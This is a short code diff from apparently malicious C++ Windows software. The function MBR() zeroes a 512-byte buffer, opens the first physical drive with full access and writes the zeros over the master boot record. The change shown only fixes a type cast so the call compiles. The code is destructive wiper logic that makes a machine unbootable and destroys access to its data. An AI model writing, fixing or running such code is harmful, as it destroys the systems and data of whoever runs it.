@@ -20,7 +20,7 @@ void MBR() {
     char mbr[512];
 
     ZeroMemory(&mbr, (sizeof mbr));
-    HANDLE MBR = CreateFile(reinterpret_cast<LPCSTR>(L"\\\\.\\PhysicalDrive0"),
+    HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0",
                             GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             nullptr, OPEN_EXISTING, NULL, nullptr);
     WriteFile(MBR, mbr, 512, &write, nullptr);
